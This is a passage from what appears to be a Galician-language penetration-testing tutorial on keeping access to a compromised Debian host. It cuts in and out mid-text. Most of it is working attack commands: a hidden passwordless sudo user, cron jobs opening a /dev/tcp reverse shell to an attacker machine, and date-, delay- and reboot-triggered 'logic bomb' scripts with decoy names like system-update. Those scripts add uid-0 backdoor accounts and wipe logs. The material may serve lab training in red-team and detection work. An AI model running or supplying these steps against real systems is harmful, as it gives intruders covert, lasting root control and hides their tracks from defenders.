+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>ii<span class="w">  </span>sudo<span class="w">           </span><span class="m">1</span>.9.13p3-1+deb12u1<span class="w"> </span>amd64<span class="w">        </span>Provide<span class="w"> </span>limited<span class="w"> </span>super<span class="w"> </span>user<span class="w"> </span>privileges<span class="w"> </span>to<span class="w"> </span>specific<span class="w"> </span>users
+</span></code></pre></div>
+Se o paquete non está instalado podemos subir o paquete .deb á máquina víctima e instalalo:<br />
+1. Identificar o paquete exacto que precisa <code>sudo</code> na máquina víctima:<br />
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>$<span class="w"> </span>cat<span class="w"> </span>/etc/os-release
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="nv">PRETTY_NAME</span><span class="o">=</span><span class="s2">&quot;Debian GNU/Linux 11 (bullseye)&quot;</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="nv">NAME</span><span class="o">=</span><span class="s2">&quot;Debian GNU/Linux&quot;</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="nv">VERSION_ID</span><span class="o">=</span><span class="s2">&quot;11&quot;</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="nv">VERSION</span><span class="o">=</span><span class="s2">&quot;11 (bullseye)&quot;</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="nv">VERSION_CODENAME</span><span class="o">=</span>bullseye
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="nv">ID</span><span class="o">=</span>debian
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="nv">HOME_URL</span><span class="o">=</span><span class="s2">&quot;https://www.debian.org/&quot;</span>
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="nv">SUPPORT_URL</span><span class="o">=</span><span class="s2">&quot;https://www.debian.org/support&quot;</span>
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="nv">BUG_REPORT_URL</span><span class="o">=</span><span class="s2">&quot;https://bugs.debian.org/&quot;</span>
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>$<span class="w"> </span>uname<span class="w"> </span>-m
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>x86_64
+</span></code></pre></div>
+2. Descargar o paquete <code>sudo</code> na máquina atacante(kali) dende o snapshot oficial (neste caso Debian11): 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>wget<span class="w"> </span>https://snapshot.debian.org/archive/debian-security/20250630T180401Z/pool/updates/main/s/sudo/sudo_1.9.5p2-3%2Bdeb11u2_amd64.deb
+</span></code></pre></div>
+3. Subir o paquete <code>deb</code> de <code>sudo</code> á máquina víctima ao <code>$HOME</code> do usuario comprometido:<br />
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>scp<span class="w"> </span>sudo*.deb<span class="w"> </span><span class="o">[</span>usuario_comprometido<span class="o">]</span>@<span class="o">[</span>IP_máquina_víctima<span class="o">]</span>:
+</span></code></pre></div>
+4. Instalar o paquete co usuario <code>root</code> (previamente comprometido).</p>
+<div class="admonition info">
+<p class="admonition-title">Nota Importante</p>
+<p>Para instalar o paquete, é necesario ter unha consola <code>root</code> cun TTY consistente. Podes empregar o método da <strong><a href="#opcion-3-engadir-usuario-permanente-e-ademais-facelo-root">Opción 3</a></strong> para logralo.</p>
+</div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># cd /home/usuario_comprometido</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="c1"># dpkg -i sudo*.deb </span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="c1"># dpkg -l sudo</span>
+</span></code></pre></div>
+</div>
+<p>Na máquina comprometida, como <code>root</code> con TTY interactiva:  </p>
+<ol>
+<li>
+<p>Primeiro, creamos un usuario normal que pasa desapercibido:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">source</span><span class="w"> </span>/etc/profile
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>useradd<span class="w"> </span>-m<span class="w"> </span>sysadmin<span class="w"> </span>-s<span class="w"> </span>/bin/bash
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;s|sysadmin:!|sysadmin:|&#39;</span><span class="w"> </span>/etc/shadow
+</span></code></pre></div></p>
+</li>
+<li>
+<p>Despois, configuramos <code>sudo</code> para que este usuario poida executar calquera comando sen contrasinal:<br />
+<strong>Opción A:</strong><br />
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;sysadmin ALL=(ALL) NOPASSWD: ALL&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/sudoers.d/sysadmin
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>chmod<span class="w"> </span><span class="m">440</span><span class="w"> </span>/etc/sudoers.d/sysadmin
+</span></code></pre></div>
+<strong>Opción B:</strong><br />
+Ou editando directamente con visudo (máis seguro):
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>visudo
+</span></code></pre></div>
+E engadir ao final do arquivo:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>sysadmin ALL=(ALL) NOPASSWD: ALL
+</span></code></pre></div></p>
+</li>
+<li>
+<p>Agora podemos verificar o acceso dende a shell do usuario comprometido para acceder ao novo usuario <code>sysadmin</code> sen contrasinal e da aí facernos <code>root</code> mediante <code>sudo</code>:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>$<span class="w"> </span>su<span class="w"> </span>-<span class="w"> </span>sysadmin
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="w">  </span>$<span class="w"> </span>sudo<span class="w"> </span>-l
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="w">  </span>Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>sysadmin<span class="w"> </span>on<span class="w"> </span>basic:
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,<span class="w"> </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="w">  </span>User<span class="w"> </span>sysadmin<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>basic:
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="w">      </span><span class="o">(</span>ALL<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>ALL
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="w">  </span>$<span class="w"> </span>sudo<span class="w"> </span>su<span class="w"> </span>-
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="w">    </span><span class="c1"># whoami</span>
+</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="w">    </span>root
+</span></code></pre></div></p>
+</li>
+</ol>
+<p>Esta técnica é especialmente útil porque non require modificar usuarios existentes e permite manter acceso privilexiado de forma máis discreta. O usuario pode executar <code>sudo su -</code> ou <code>sudo bash</code> para obter unha shell root inmediatamente.</p>
+<hr />
+<h2 id="4-bloque-iii-automatizacion-e-eventos-triggers">4. Bloque III: Automatización e Eventos (Triggers)</h2>
+<h3 id="opcion-6-tarefa-programada-cron-job">Opción 6 - Tarefa programada (Cron Job)</h3>
+<p>Esta técnica establece unha conexión automática cada 5 minutos mediante un cron job que executa unha reverse shell.</p>
+<p>Primeiro, na máquina Kali Linux, deixar un listener á escoita:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">5555</span>
+</span></code></pre></div></p>
+<p><strong>Variante 1</strong>:<br />
+Na máquina comprometida, como <code>root</code>, crear unha tarefa cron:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;*/5 * * * * root bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.53/5555 0&gt;&amp;1&quot;&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/crontab
+</span></code></pre></div></p>
+<p><strong>Variante 2</strong>:<br />
+Ou crear un ficheiro directamente no directorio cron.d:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;*/5 * * * * root bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.53/5555 0&gt;&amp;1&quot;&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/cron.d/persist
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>chmod<span class="w"> </span><span class="m">644</span><span class="w"> </span>/etc/cron.d/persist
+</span></code></pre></div></p>
+<p><strong>Variante 3</strong>:<br />
+Para facer a conexión máis silenciosa, podemos crear un script en <code>/usr/local/bin/</code>:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="s1">bash -i &gt;&amp; /dev/tcp/192.168.56.53/5555 0&gt;&amp;1&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/usr/local/bin/system-update
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/usr/local/bin/system-update
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;*/5 * * * * root /usr/local/bin/system-update&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/crontab
+</span></code></pre></div></p>
+<p><strong>Variante 4: Bombas Lóxicas (Triggers)</strong></p>
+<p>Bomba lóxica baseada en data: Esta técnica establece código malicioso que se activa automaticamente nunha data específica.</p>
+<p><code>Opción A</code>: Crear un script que se active nunha data específica.
+<em>Nota: Reordenáronse os comandos para asegurar a persistencia (useradd) antes de lanzar a shell bloqueante.</em></p>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /usr/local/bin/system-maintenance</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="s">#!/bin/bash</span>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="s"># Data obxectivo: 25 de decembro de 2025</span>
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="s">TARGET_DATE=&quot;2025-12-25&quot;</span>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="s">CURRENT_DATE=$(date +%Y-%m-%d)</span>
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="s">if [ &quot;$CURRENT_DATE&quot; == &quot;$TARGET_DATE&quot; ]; then</span>
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="s">    </span>
+</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a><span class="s">    # 1. PRIORITY: Crear usuario backdoor primeiro</span>
+</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a><span class="s">    # (Descomenta para activar)</span>
+</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a><span class="s">    # useradd -m -o -u 0 -g 0 santa 2&gt;/dev/null</span>
+</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a><span class="s">    # echo &quot;santa:HoHoHo123&quot; | chpasswd</span>
+</span><span id="__span-29-14"><a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a><span class="s">    </span>
+</span><span id="__span-29-15"><a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a><span class="s">    # 2. Limpar logs</span>
+</span><span id="__span-29-16"><a id="__codelineno-29-16" name="__codelineno-29-16" href="#__codelineno-29-16"></a><span class="s">    # &gt; /var/log/auth.log</span>
+</span><span id="__span-29-17"><a id="__codelineno-29-17" name="__codelineno-29-17" href="#__codelineno-29-17"></a><span class="s">    # &gt; /var/log/syslog</span>
+</span><span id="__span-29-18"><a id="__codelineno-29-18" name="__codelineno-29-18" href="#__codelineno-29-18"></a>
+</span><span id="__span-29-19"><a id="__codelineno-29-19" name="__codelineno-29-19" href="#__codelineno-29-19"></a><span class="s">    # 3. FINALMENTE: Activar payload (bloqueante)</span>
+</span><span id="__span-29-20"><a id="__codelineno-29-20" name="__codelineno-29-20" href="#__codelineno-29-20"></a><span class="s">    bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.53/5555 0&gt;&amp;1&#39;</span>
+</span><span id="__span-29-21"><a id="__codelineno-29-21" name="__codelineno-29-21" href="#__codelineno-29-21"></a><span class="s">fi</span>
+</span><span id="__span-29-22"><a id="__codelineno-29-22" name="__codelineno-29-22" href="#__codelineno-29-22"></a>
+</span><span id="__span-29-23"><a id="__codelineno-29-23" name="__codelineno-29-23" href="#__codelineno-29-23"></a><span class="s"># Comportamento normal para non levantar sospeitas</span>
+</span><span id="__span-29-24"><a id="__codelineno-29-24" name="__codelineno-29-24" href="#__codelineno-29-24"></a><span class="s">echo &quot;System maintenance check completed&quot;</span>
+</span><span id="__span-29-25"><a id="__codelineno-29-25" name="__codelineno-29-25" href="#__codelineno-29-25"></a><span class="s">exit 0</span>
+</span><span id="__span-29-26"><a id="__codelineno-29-26" name="__codelineno-29-26" href="#__codelineno-29-26"></a><span class="s">EOF</span>
+</span><span id="__span-29-27"><a id="__codelineno-29-27" name="__codelineno-29-27" href="#__codelineno-29-27"></a>
+</span><span id="__span-29-28"><a id="__codelineno-29-28" name="__codelineno-29-28" href="#__codelineno-29-28"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/usr/local/bin/system-maintenance
+</span></code></pre></div>
+Engadir ao crontab:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;0 2 * * * root /usr/local/bin/system-maintenance&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/crontab
+</span></code></pre></div></p>
+<p><code>Opción B</code>: Crear un script que se active con múltiples condicións (data e hora específica):
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /etc/cron.d/backup-scheduler</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="s">#!/bin/bash</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="s">TARGET_DATE=&quot;2025-12-31&quot;</span>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="s">TARGET_HOUR=&quot;23&quot;</span>
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="s">CURRENT_DATE=$(date +%Y-%m-%d)</span>
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="s">CURRENT_HOUR=$(date +%H)</span>
+</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>
+</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="s">if [ &quot;$CURRENT_DATE&quot; == &quot;$TARGET_DATE&quot; ] &amp;&amp; [ &quot;$CURRENT_HOUR&quot; == &quot;$TARGET_HOUR&quot; ]; then</span>
+</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a><span class="s">    # Payload de fin de ano</span>
+</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a><span class="s">    bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.53/5555 0&gt;&amp;1&#39; &amp;</span>
+</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a><span class="s">    </span>
+</span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a><span class="s">    # Engadir un usuario backdoor ao ficheiro /etc/passwd real</span>
+</span><span id="__span-31-14"><a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a><span class="s">    echo &quot;backdoor::0:0:System Backup:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</span>
+</span><span id="__span-31-15"><a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a><span class="s">fi</span>
+</span><span id="__span-31-16"><a id="__codelineno-31-16" name="__codelineno-31-16" href="#__codelineno-31-16"></a><span class="s">EOF</span>
+</span></code></pre></div></p>
+<p><code>Opción C</code>: Script que se activa despois de certo tempo (30 días):
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /usr/local/bin/delayed-payload</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="s">#!/bin/bash</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="s">TRIGGER_FILE=&quot;/var/.trigger_date&quot;</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="s"># Se non existe o arquivo, crealo coa data actual</span>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="s">if [ ! -f &quot;$TRIGGER_FILE&quot; ]; then</span>
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="s">    date +%s &gt; &quot;$TRIGGER_FILE&quot;</span>
+</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a><span class="s">    exit 0</span>
+</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a><span class="s">fi</span>
+</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a>
+</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a><span class="s"># Ler a data de activación</span>
+</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a><span class="s">START_DATE=$(cat &quot;$TRIGGER_FILE&quot;)</span>
+</span><span id="__span-32-14"><a id="__codelineno-32-14" name="__codelineno-32-14" href="#__codelineno-32-14"></a><span class="s">CURRENT_DATE=$(date +%s)</span>
+</span><span id="__span-32-15"><a id="__codelineno-32-15" name="__codelineno-32-15" href="#__codelineno-32-15"></a><span class="s">DIFF_DAYS=$(( ($CURRENT_DATE - $START_DATE) / 86400 ))</span>
+</span><span id="__span-32-16"><a id="__codelineno-32-16" name="__codelineno-32-16" href="#__codelineno-32-16"></a>
+</span><span id="__span-32-17"><a id="__codelineno-32-17" name="__codelineno-32-17" href="#__codelineno-32-17"></a><span class="s"># Activar despois de 30 días</span>
+</span><span id="__span-32-18"><a id="__codelineno-32-18" name="__codelineno-32-18" href="#__codelineno-32-18"></a><span class="s">if [ $DIFF_DAYS -ge 30 ]; then</span>
+</span><span id="__span-32-19"><a id="__codelineno-32-19" name="__codelineno-32-19" href="#__codelineno-32-19"></a><span class="s">    # Payload</span>
+</span><span id="__span-32-20"><a id="__codelineno-32-20" name="__codelineno-32-20" href="#__codelineno-32-20"></a><span class="s">    bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.53/5555 0&gt;&amp;1&#39; &amp;</span>
+</span><span id="__span-32-21"><a id="__codelineno-32-21" name="__codelineno-32-21" href="#__codelineno-32-21"></a><span class="s">    </span>
+</span><span id="__span-32-22"><a id="__codelineno-32-22" name="__codelineno-32-22" href="#__codelineno-32-22"></a><span class="s">    # Eliminar o trigger para non executar de novo</span>
+</span><span id="__span-32-23"><a id="__codelineno-32-23" name="__codelineno-32-23" href="#__codelineno-32-23"></a><span class="s">    rm -f &quot;$TRIGGER_FILE&quot;</span>
+</span><span id="__span-32-24"><a id="__codelineno-32-24" name="__codelineno-32-24" href="#__codelineno-32-24"></a><span class="s">fi</span>
+</span><span id="__span-32-25"><a id="__codelineno-32-25" name="__codelineno-32-25" href="#__codelineno-32-25"></a><span class="s">EOF</span>
+</span><span id="__span-32-26"><a id="__codelineno-32-26" name="__codelineno-32-26" href="#__codelineno-32-26"></a>
+</span><span id="__span-32-27"><a id="__codelineno-32-27" name="__codelineno-32-27" href="#__codelineno-32-27"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/usr/local/bin/delayed-payload
+</span><span id="__span-32-28"><a id="__codelineno-32-28" name="__codelineno-32-28" href="#__codelineno-32-28"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;0 */6 * * * root /usr/local/bin/delayed-payload&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/crontab
+</span></code></pre></div></p>
+<p><code>Opción D</code>: Script baseado no número de reinicios do sistema.
+<em>Nota: Versión mellorada con cabeceira LSB e uso de <code>update-rc.d</code>.</em></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /etc/init.d/boot-counter</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="s">#!/bin/bash</span>
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="s">### BEGIN INIT INFO</span>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="s"># Provides:          boot-counter</span>
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="s"># Required-Start:    $all</span>
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="s"># Required-Stop:     </span>
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="s"># Default-Start:     2 3 4 5</span>
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="s"># Default-Stop:      0 1 6</span>
+</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a><span class="s"># Short-Description: Conta reinicios para persistencia</span>
+</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a><span class="s">### END INIT INFO</span>
+</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>
+</span><span id="__span-33-12"><a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a><span class="s">COUNTER_FILE=&quot;/var/.boot_count&quot;</span>
+</span><span id="__span-33-13"><a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a><span class="s">TRIGGER_COUNT=3  # 3 reinicios</span>
+</span><span id="__span-33-14"><a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a>
+</span><span id="__span-33-15"><a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a><span class="s"># Crear contador se non existe</span>
+</span><span id="__span-33-16"><a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a><span class="s">if [ ! -f &quot;$COUNTER_FILE&quot; ]; then</span>
+</span><span id="__span-33-17"><a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a><span class="s">    echo &quot;0&quot; &gt; &quot;$COUNTER_FILE&quot;</span>
+</span><span id="__span-33-18"><a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a><span class="s">fi</span>
+</span><span id="__span-33-19"><a id="__codelineno-33-19" name="__codelineno-33-19" href="#__codelineno-33-19"></a>
+</span><span id="__span-33-20"><a id="__codelineno-33-20" name="__codelineno-33-20" href="#__codelineno-33-20"></a><span class="s"># Ler e incrementar</span>
+</span><span id="__span-33-21"><a id="__codelineno-33-21" name="__codelineno-33-21" href="#__codelineno-33-21"></a><span class="s">COUNT=$(cat &quot;$COUNTER_FILE&quot;)</span>
+</span><span id="__span-33-22"><a id="__codelineno-33-22" name="__codelineno-33-22" href="#__codelineno-33-22"></a><span class="s">COUNT=$((COUNT + 1))</span>
+</span><span id="__span-33-23"><a id="__codelineno-33-23" name="__codelineno-33-23" href="#__codelineno-33-23"></a><span class="s">echo $COUNT &gt; &quot;$COUNTER_FILE&quot;</span>
+</span><span id="__span-33-24"><a id="__codelineno-33-24" name="__codelineno-33-24" href="#__codelineno-33-24"></a>
